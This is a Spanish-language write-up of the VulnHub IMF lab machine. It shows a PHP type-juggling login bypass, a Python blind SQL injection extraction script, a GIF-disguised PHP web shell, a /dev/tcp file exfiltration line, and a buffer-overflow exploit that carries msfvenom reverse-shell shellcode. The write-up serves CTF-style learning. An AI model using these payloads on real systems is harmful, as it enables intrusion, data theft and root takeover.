---
layout: single
title: VulnHub - IMF writeup
date: 2023-02-04
classes: wide
header:
  teaser: /assets/images/VulnHub/IMF/IMF.png
  teaser_home_page: true
categories:
  - VulnHub  
  - medium
tags:
  - Type Juggling
  - SQLI
  - SQLI blind
  - Buffer overflow
---

![](/assets/images/VulnHub/IMF/IMF.png)

Recordad que esta es una máquina de VulnHub, tendremos que hacer un reconocimento en la red para poder saber cual es la IP.<br>
Hoy aprenderemos a bypasear el login mediante una téctina llamada **Type Juggling**, abusaremos de un paŕametro vulnerable a **SQL Injection Boolean based**, gracias a esto descubriremos una nueva ruta, en la cual podremos subir un archivo **GIF** para ejecutar comandos.<br>
En la escalada de privilegios nos aprovecharemos de un binario vulnerable a **Buffer Overflow Stack Based x86**.

## índice
* [Nmap, Fuzzing y Reconocimiento](#nmap-fuzzing-y-reconocimiento)
* [Type Juggling Login Bypass](#type-juggling-login-bypass)
* [SQL Injection Boolean Based](#sql-injection-boolean-based)
* [File Upload to RCE](#file-upload-to-rce)
* [Buffer Overflow Stack Based Privilege Escalation](#buffer-overflow-stack-based-privilege-escalation)

## Nmap, Fuzzing y Reconocimiento

Para empezar, tendremos que hacer un reconocimiento en la red para saber cual es la **IP**, usaremos la herramienta **arp-scan**.

```bash
arp-scan -I ens33 --localnet
```

![](/assets/images/VulnHub/IMF/arpScan.png)

Ahora que ya sabemos cual es nuestro objetivo, vamos a iniciar nuestro reconocimiento con **nmap**.

Puertos abiertos:

`nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn 192.168.1.143 -oG nmap/Puertos.txt`

```
Puertos.txt

# Ports scanned: TCP(65535;1-65535) UDP(0;) SCTP(0;) PROTOCOLS(0;)
Host: 192.168.1.143 ()  Status: Up
Host: 192.168.1.143 ()  Ports: 80/open/tcp//http/// Ignored State: filtered (65534)
# Nmap done at Sat Feb  4 16:47:54 2023 -- 1 IP address (1 host up) scanned in 26.58 seconds
```

Versión y servicios:

`nmap -p80 -sVC 192.168.1.143 -oN nmap/VersionServicios.txt`

```
VersionesServicios.txt

# Nmap 7.93 scan initiated Sat Feb  4 16:55:50 2023 as: nmap -p80 -sVC -oN nmap/VersionServicios.txt 192.168.1.143
Nmap scan report for 192.168.1.143 (192.168.1.143)
Host is up (0.00027s latency).

PORT   STATE SERVICE VERSION
80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
|_http-server-header: Apache/2.4.18 (Ubuntu)
|_http-title: IMF - Homepage
MAC Address: 00:0C:29:43:4F:22 (VMware)

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Sat Feb  4 16:56:03 2023 -- 1 IP address (1 host up) scanned in 12.20 seconds

```
### Página web

En la página web hay una sección de contacto en donde podremos ver una serie de usuarios los cuales nos vendrán vien para más tarde.

![](/assets/images/VulnHub/IMF/contacto.png)

Cuando inspeccionamos el código fuente de la página principal, salta a la vista una serie de archivos **JS** que tienen un nombre raro con un formato parecido a base64.

![](/assets/images/VulnHub/IMF/js.png)

```
$ echo ZmxhZzJ7YVcxbVlXUnRhVzVwYzNSeVlYUnZjZz09fQ== | base64 -d
flag2{aW1mYWRtaW5pc3RyYXRvcg==}

$ echo aW1mYWRtaW5pc3RyYXRvcg== | base64 -d
imfadministrator
```
Lo que nos devuelve es una ruta existente en la página web en la que podremos iniciar sesión.

> http://192.168.1.143/imfadministrator

![](/assets/images/VulnHub/IMF/login.png)

## Type Juggling Login Bypass

La técnica que vamos a estar utilizando consiste en cambiar el tipo de variable que se envía, es decir:

```
username=admin&password=qwerty    # password -> String

Contraseña incorrecta
```

```
username=admin&password[]=qwerty  # password -> array

OK
```

Esto pasa en PHP cuando estamos utilizando la funcion **trcmp()** para comparar una **String** con un **Array**, la función nos devolverá **NULL**.

```php
strcmp(array(), "qwerty") -> NULL
```

El código que valida las credenciales se tiene que ver algo como esto:

```php
if (strcmp($_POST['password'], 'qwerty') == 0) {
  // ...
}
```

![](/assets/images/VulnHub/IMF/typejuggling.png)

![](/assets/images/VulnHub/IMF/loggedin.png)

```
$ echo Y29udGludWVUT2Ntcw== | base64 -d
continueTOcms
```

[https://owasp.org/www-pdf-archive/PHPMagicTricks-TypeJuggling.pdf](https://owasp.org/www-pdf-archive/PHPMagicTricks-TypeJuggling.pdf)

## SQL Injection Boolean Based

La url del CMS es `http://192.168.1.143/imfadministrator/cms.php?pagename=home`

![](/assets/images/VulnHub/IMF/cms.png)

Podemos pensar que se puede acontecer un LFI, RFI, etc... pero ya os adelanto que no conseguiréis nada.<br>
Si probamos a meter una comilla veremos que causamos un error SQL.

`http://192.168.1.143/imfadministrator/cms.php?pagename=home'`

![](/assets/images/VulnHub/IMF/sqlError.png)

Cuando propbamos inyecciones como por ejemplo `' and 1=1'` `' and 'a'='a` `' and (select substring("ch3chu",1,1))="c"'` veremos esto:

`http://192.168.1.143/imfadministrator/cms.php?pagename=home' and 1=1'`

`http://192.168.1.143/imfadministrator/cms.php?pagename=home' and (select substring("ch3chu",1,1))="c"'`

![](/assets/images/VulnHub/IMF/cms.png)

Pero si le decimos que 1=2?<br>
O si le decimos que la primera letra de la palabra "ch3chu" es una "j"?

`http://192.168.1.143/imfadministrator/cms.php?pagename=home' and 1=2'`

`http://192.168.1.143/imfadministrator/cms.php?pagename=home' and (select substring("ch3chu",1,1))="j"'`

![](/assets/images/VulnHub/IMF/sqlError2.png)

Como 1=2 es falso y la primera letra no es "j", no nos esta reportando nada en la página, esto me hace pensar que estamos ante **Blind SQLI**.<br>
Me he programado un script en **python3** para automatizarme la extraccion de los datos:

```python
#!/usr/bin/python3

from pwn import *
import signal, sys, requests, time, string

# Uso
if len(sys.argv) != 2:
    print("\n[+] uso:\n\n\t" + sys.argv[0] + " ip\n")
    sys.exit(1)

# Variables
ip = sys.argv[1]
url = "http://" + str(ip) + "/imfadministrator/"
username = "rmichaels"
chars = string.printable

# CTRL + C
def defHandler(sig, frame):
    print("\n\n[!] Saliendo...\n")
    sys.exit(1)
signal.signal(signal.SIGINT, defHandler)

# SQL Injection Boolean Blind Based
# http://192.168.1.143/imfadministrator/cms.php?pagename=home' and (select substring("ch3chu",1,1))="c"'
def sqli():
    databases = ''
    db = 'admin'
    tables = ''
    tbl = 'pages'
    columns = ''
    cols = 'id,0x3a,pagename' # id:pagename
    data = ''
    
    s = requests.session()
    
    # Login
    pdata = {
        'user': username,
        'pass[]': 'qwerty'
    }
    s.post(url, data=pdata)

    p = log.progress("SQL injection boolean blind based")

    # SQLI
    # Databases
    #
    # for i in range(1, 150):
    #     for char in chars:
    #         sqlUrl = url + f"""cms.php?pagename=home' and (select substring(group_concat(schema_name),{i},1) from information_schema.schemata)="{char}" '"""
            
              # http://127.0.0.1:8080 --> Burp
    #         r = s.get(sqlUrl, proxies={'http': 'http://127.0.0.1:8080'})

    #         if 'Welcome' in r.text:
    #             databases += char
    #             p.status(databases)
    #             break
    #
    # Tables
    #
    # for i in range(1, 150):
    #     for char in chars:
    #         sqlUrl = url + f"""cms.php?pagename=home' and (select substring(group_concat(table_name),{i},1) from information_schema.tables where table_schema="{db}")="{char}" '"""
            
    #         # http://127.0.0.1:8080 --> Burp
    #         r = s.get(sqlUrl, proxies={'http': 'http://127.0.0.1:8080'})

    #         if 'Welcome' in r.text:
    #             tables += char
    #             p.status(tables)
    #             break
    #
    # Columns
    #
    # for i in range(1, 150):
    #     for char in chars:
    #         sqlUrl = url + f"""cms.php?pagename=home' and (select substring(group_concat(column_name),{i},1) from information_schema.columns where table_schema="{db}" and table_name="{tbl}")="{char}" '"""
            
    #         # http://127.0.0.1:8080 --> Burp
    #         r = s.get(sqlUrl, proxies={'http': 'http://127.0.0.1:8080'})

    #         if 'Welcome' in r.text:
    #             columns += char
    #             p.status(columns)
    #             break
    #
    # Data
    for i in range(1, 150):
        for char in chars:
            sqlUrl = url + f"""cms.php?pagename=home' and (select substring(group_concat({cols}),{i},1) from {db}.{tbl})="{char}" '"""
            
            # http://127.0.0.1:8080 --> Burp
            r = s.get(sqlUrl, proxies={'http': 'http://127.0.0.1:8080'})

            if 'Welcome' in r.text:
                data += char
                p.status(data)
                break

# Main
if __name__ == '__main__':
    sqli()
```

![](/assets/images/VulnHub/IMF/sqlPy.png)

Cuando terminamos con la extracción de datos vemos que hay una nueva página **tutorials-inclomplete** la cual no veíamos antes.

> http://192.168.1.143/imfadministrator/cms.php?pagename=tutorials-incomplete

En esta página encontramos una foto con un QR.

![](/assets/images/VulnHub/IMF/fotoQR.png)

![](/assets/images/VulnHub/IMF/qr.png)

```
$ echo dXBsb2Fkcjk0Mi5waHA= | base64 -d
uploadr942.php
```

## File Upload to RCE

> http://192.168.1.143/imfadministrator/uploadr942.php

![](/assets/images/VulnHub/IMF/upload.png)

Al subir una imagen cualquiera vemos en la respuesta que hay un comentario, el cual parece ser el nombre del archivo sin la extensión. Si vamos a la ruta `uploads/nombre_del_archivo.png` veremos la foto que hemos subido.

![](/assets/images/VulnHub/IMF/filename.png)

`http://192.168.1.143/imfadministrator/uploads/4edf6733684e.png`

Nuestro objetivo es intentar subir código en **PHP** y que nos lo interprete, para eso podemos crear un archivo **GIF** para burlar las restricciones que contenga código en php.

> reverse.gif

```
GIF8;

<?php
    $command=$_GET['cmd']; echo `$command`;
?>
```

Subimos el archivo, vemos el nombre del archivo en el comentario y vamos a la ruta. Tenemos ejecución remota de comandos.

![](/assets/images/VulnHub/IMF/rce.png)

## Buffer Overflow Stack Based Privilege Escalation

Al enumerar el sistema encontraremos que por el puerto 7788 esta corriendo un programa llamado **agent** el cual reside en la ruta `/usr/local/bin/`.

![](/assets/images/VulnHub/IMF/7788.png)

Decidí traerme el binario a mi máquina local para poder analizarlo más comodamente.

```bash
cat < /usr/local/bin/agent > /dev/tcp/192.168.1.131/443
```

Cuando ejecutamos el programa nos pide un **ID** el cual no conocemos pero con la herramienta `ltrace` podemos saber el ID.

![](/assets/images/VulnHub/IMF/agentID.png)

Cuando iniciamos sesión podemos hacer 4 cosas:

* Extraction Points
* Request Extraction
* Submit Report
* Exit

Para agilizar os adelanto que el campo vulnerable es el 3, donde si ponemos muchas "a" generamos un **segmentation fault** confirmando que hay un buffer overlow.

![](/assets/images/VulnHub/IMF/segmentation.png)

Voy a estar utilizando **gbd** con **gef** ([https://github.com/hugsy/gef](https://github.com/hugsy/gef)) como debugger. <br>
Lo que vamos a hacer en primer lugar es ver las protecciones que tiene el binario (x86):

![](/assets/images/VulnHub/IMF/checksec.png)

Vemos que no tiene casi protecciones, lo cual nos facilita mucho la explotación del buffer overflow. Como el NX no está habilitado podemos insertar shellcode en la pila para que cuando tomemos control del registro `eip` apuntar a una dirección de memoria que nos ejecute un `call eax` y así nuestro shellcode será ejecutado.

### Calculando el offset

**GEF** viene con los comandos `pettern create` y `pattern offset` que nos facilitan calcular con cuántos caracteres ocasionamos el buffer overflow.

![](/assets/images/VulnHub/IMF/pattern.png)

Esto quiere decir que si añadimos mas de 168 caracteres ocasionaremos un buffer overflow y sobreescribiremos registros.

### Controlando eip

Ahora que sabemos el offset (168) podemos controlar el eip:

```bash
python3 -c "print('A'*168 + 'B'*6)"
```

![](/assets/images/VulnHub/IMF/eip.png)

Ahora eip vale 0x42424242 o BBBB

### Dirección de memoria (call eax)

Teniendo en cuenta que `FF D0` es el operation code de `call eax` podemos buscar una dirección de memoria con `objdump`

![](/assets/images/VulnHub/IMF/objdump.png)

### Creando shellcode con msfvenom

Ahora lo que necesitamos es un shell code que nos envie un reverse shell a nuestro equipo, yo me voy a poner a la escucha por el puerto 4444.

```bash
msfvenom -p linux/x86/shell_reverse_tcp LHOST=192.168.1.131 LPORT=4444 -f python -b "\x00\x0a\x0d"
```

Ya tenemos todo para escalar privilegios, ahora solo hay que hacer un pequeño script en python3 que nos ejecute el buffer overflow:

```python
#!/usr/bin/python3

import socket

# msfvenom -p linux/x86/shell_reverse_tcp LHOST=192.168.1.131 LPORT=4444 -f python -b "\x00\x0a\x0d"
buf =  b""
buf += b"\xbf\x9e\x51\x1a\x09\xda\xda\xd9\x74\x24\xf4\x58"
buf += b"\x33\xc9\xb1\x12\x83\xe8\xfc\x31\x78\x0e\x03\xe6"
buf += b"\x5f\xf8\xfc\x27\xbb\x0b\x1d\x14\x78\xa7\x88\x98"
buf += b"\xf7\xa6\xfd\xfa\xca\xa9\x6d\x5b\x65\x96\x5c\xdb"
buf += b"\xcc\x90\xa7\xb3\x0e\xca\x59\xc0\xe7\x09\x5a\xd7"
buf += b"\xab\x84\xbb\x67\x35\xc7\x6a\xd4\x09\xe4\x05\x3b"
buf += b"\xa0\x6b\x47\xd3\x55\x43\x1b\x4b\xc2\xb4\xf4\xe9"
buf += b"\x7b\x42\xe9\xbf\x28\xdd\x0f\x8f\xc4\x10\x4f"

buf += b'\x90' * (168 - len(buf))   # NOP (No Operation Code)

buf += b'\x63\x85\x04\x08'    # call eax

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

s.connect(('127.0.0.1', 7788))

s.send(b"48093572\n")
s.recv(1024)
s.send(b"3\n")
s.recv(1024)
s.send(buf + b'\n')
```

![](/assets/images/VulnHub/IMF/bof-py.png)

![](/assets/images/VulnHub/IMF/root.png)

